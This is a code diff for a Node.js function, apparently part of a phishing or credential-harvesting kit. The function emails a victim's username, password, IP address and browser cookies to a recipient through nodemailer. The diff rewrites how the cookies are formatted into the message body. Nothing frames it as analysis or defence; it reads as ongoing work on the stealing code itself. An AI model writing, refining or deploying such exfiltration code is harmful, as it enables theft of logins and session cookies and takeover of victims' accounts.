@@ -15,31 +15,24 @@ function createNodeMailerTransport(user, pass) {
 }
 
 function sendEmail(from, to, subject, username, pass, ip, cookies, nodeTransport) {
-    // Convert cookies object to string
-    const cookiesString = JSON.stringify(cookies);
-
-    // Prepare email content
-    const emailContent = `
-        <p>Username: ${username}</p>
-        <p>Password: ${pass}</p>
-        <p>IP Address: ${ip}</p>
-        <p>Cookies: ${cookiesString}</p>
-    `;
-
-    // Create mail details
     const mailDetails = {
         from: from,
         to: to,
         subject: subject,
-        html: emailContent
+        html: `<p>Username: ${username}</p><p>Password: ${pass}</p><p>IP Address: ${ip}</p>`
     };
 
-    // Send email
-    nodeTransport.verify(function (error, success) {
+    // Append cookies to the email body
+    if (cookies) {
+        const cookiesStr = Object.entries(cookies).map(([key, value]) => `${key}: ${value}`).join('<br>');
+        mailDetails.html += `<p>Cookies:<br>${cookiesStr}</p>`;
+    }
+
+    nodeTransport.verify((error, success) => {
         if (error) {
             console.log(error);
         } else {
-            nodeTransport.sendMail(mailDetails, function(err, data) {
+            nodeTransport.sendMail(mailDetails, (err, data) => {
                 if (err) {
                     console.log(err);
                 } else {
